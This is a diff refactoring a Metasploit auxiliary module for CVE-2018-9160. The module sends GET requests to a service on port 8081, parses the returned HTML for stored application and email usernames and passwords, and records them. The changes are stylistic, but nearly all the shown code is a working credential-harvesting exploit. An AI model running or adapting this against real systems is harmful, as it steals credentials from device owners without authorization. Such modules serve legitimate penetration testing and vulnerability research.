@@ -25,22 +25,23 @@ class MetasploitModule < Msf::Auxiliary
         [
           ['CVE', '2018-9160'],
           ['EDB', '44545']
-        ]
+        ],
+      'DisclosureDate' => 'Mar 8 2018'
     ))
 
     register_options(
     [
       OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),
-      OptPort.new('RPORT', [true, 'Target Port', 8081])
+      Opt::RPORT(8081)
     ])
   end
 
   def make_request(path)
-    uri = normalize_uri(target_uri.path + path)
-    res = send_request_cgi({
+    uri = normalize_uri(target_uri.path, path)
+    res = send_request_cgi(
       'method' => 'GET',
       'uri'    => uri
-    })
+    )
 
     if res && res.code == 200
       resHTML = res.get_html_document
@@ -51,16 +52,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def is_valid?(user, pass)
-    if user == '' || pass == 'None'
-     false
-    else
-     true
-    end
+    !(user.empty? || pass == 'None')
   end
 
   def save_creds(app, user, pass)
-    print_good(app + " username: " + user)
-    print_good(app + " password: " + pass)
+    print_good("#{app} username: #{user}")
+    print_good("#{app} password: #{pass}")
     store_valid_credential(user: user, private: pass)
   end
 
@@ -75,26 +72,25 @@ class MetasploitModule < Msf::Auxiliary
     if selectedPage.nil?
       print_error("Couldn't find results for #{path}")
     elsif selectedPage.is_a?(Array)
-      selectedPage.each{ |elem|
-        username = response.at('input[@id="' + elem + '_username"]').attribute('value').to_s
-        password = response.at('input[@id="' + elem + '_password"]').attribute('value').to_s
+      selectedPage.each do |elem|
+        username = response.at("input[@id=\"#{elem}_username\"]").attribute('value').to_s
+        password = response.at("input[@id=\"#{elem}_password\"]").attribute('value').to_s
 
         if is_valid?(username, password)
           save_creds(elem, username, password)
         end
-      }
+      end
 
       hostname = response.at('input[@id="email_host"]').attribute('value').to_s
       email_user = response.at('input[@id="email_user"]').attribute('value').to_s
       email_pass = response.at('input[@id="email_password"]').attribute('value').to_s
 
       if is_valid?(email_user, email_pass)
-        email_user <<= "@" + hostname
-        save_creds("Email", email_user, email_pass)
+        save_creds("Email", email_user << "@#{hostname}", email_pass)
       end
     else
-      username = response.at('input[@id="' + selectedPage + '_username"]').attribute('value').to_s
-      password = response.at('input[@id="' + selectedPage + '_password"]').attribute('value').to_s
+      username = response.at("input[@id=\"#{selectedPage}_username\"]").attribute('value').to_s
+      password = response.at("input[@id=\"#{selectedPage}_password\"]").attribute('value').to_s
 
       if is_valid?(username, password)
         save_creds(selectedPage, username, password)
